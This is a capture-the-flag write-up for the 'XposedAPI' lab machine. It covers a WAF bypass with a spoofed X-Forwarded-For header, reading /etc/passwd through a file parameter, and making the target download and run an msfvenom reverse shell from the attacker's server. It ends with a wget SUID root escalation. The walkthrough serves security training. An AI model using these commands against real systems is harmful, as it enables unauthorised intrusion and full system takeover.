---
icon: ubuntu
---

# XposedAPI - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.231.134 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-06 17:43 EDT
Nmap scan report for 192.168.231.134
Host is up (0.029s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
13337/tcp open  http    Gunicorn 20.0.4
|_http-title: Remote Software Management API
|_http-server-header: gunicorn/20.0.4
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   31.50 ms 192.168.45.1
2   25.68 ms 192.168.45.254
3   25.98 ms 192.168.251.1
4   26.54 ms 192.168.231.134
```

### <mark style="color:$primary;">HTTP Port 13337 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2496).png" alt=""><figcaption></figcaption></figure>

The website is exposing this machines API's

### <mark style="color:$primary;">logs Enpoint</mark>

Navigating to **`/logs`** directory, it shows that there is a Web Application Firewall denying our access to it

<figure><img src="../../.gitbook/assets/image (2497).png" alt=""><figcaption></figcaption></figure>

To bypass the WAF, we can execute a HTTP Header Attack using the following header

```
# HTTP Headers for exploit
Host
X-Forwarded-Host
X-Forwarded-For
X-Host
X-Forwarded-Server
X-HTTP-Host-Override
Forwarded

# Vulnerable "X-Forwarder-For" Header
curl http://<IP>:13337/logs -H "X-Forwarded-For:localhost"
```

<figure><img src="../../.gitbook/assets/image (2498).png" alt=""><figcaption></figcaption></figure>

Nice it worked! I can now modify the url to include the **file** parameter to access other files

```
curl http://192.168.231.134:13337/logs?file=/etc/passwd -H "X-Forwarded-For:localhost"
```

<figure><img src="../../.gitbook/assets/image (2499).png" alt=""><figcaption></figcaption></figure>

Besides root there is a user named clumsyadmin. I'll keep that in mind and try to enumerate another endpoint

### <mark style="color:$primary;">Update Endpoint</mark>

Using the information gathered earlier, I can try to do a POST request to **/update** using clumsyadmin and have it url to our machine.

<mark style="color:yellow;">**Step 1 -> Setup a python server**</mark>

```
python3 -m http.server 80
```

<mark style="color:yellow;">**Step 2 -> Execute a POST request**</mark>

```
curl -X POST http://192.168.231.134:13337/update -H "Content-Type: application/json" --data '{"user":"clumsyadmin", "url":"http://192.168.45.158"}'
```

<figure><img src="../../.gitbook/assets/image (2500).png" alt=""><figcaption></figcaption></figure>

With the POST request successfully redirecting the target machine to download patch from our HTTP server, we can now use it to download a malicious file from our server.

### <mark style="color:$primary;">RFI</mark>

Generating a malicious payload:

```
msfvenom -p linux/x64/shell_reverse_tcp lhost=192.168.45.158 lport=443 -f elf > exp.elf
```

<figure><img src="../../.gitbook/assets/image (2501).png" alt=""><figcaption></figcaption></figure>

Let's send a POST request to download our payload

```
curl -X POST http://192.168.231.134:13337/update -H "Content-Type: application/json" --data '{"user":"clumsyadmin", "url":"http://192.168.45.158/exp.elf"}'
```

<figure><img src="../../.gitbook/assets/image (2502).png" alt=""><figcaption></figcaption></figure>

Nice! now let's send a request to the **`/restart`** Endpoint to restart the software and have our payload executed. Make sure you have a listener ready

```
curl http://192.168.231.134:13337/restart
```

<figure><img src="../../.gitbook/assets/image (2503).png" alt=""><figcaption></figcaption></figure>

From the response of the GET request, it seems like we need to send a POST request according to the output to restart the application

```
curl http://192.168.231.134:13337/restart --data '{"confirm":"true"}'
```

<figure><img src="../../.gitbook/assets/image (2504).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (2505).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">wget SUID</mark>

[**GTFObins**](https://gtfobins.github.io/gtfobins/wget/#suid) offers an easy privesc solution

<figure><img src="../../.gitbook/assets/image (2506).png" alt=""><figcaption></figcaption></figure>

```
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
./wget --use-askpass=$TF 0
```

<figure><img src="../../.gitbook/assets/image (2507).png" alt=""><figcaption></figcaption></figure>
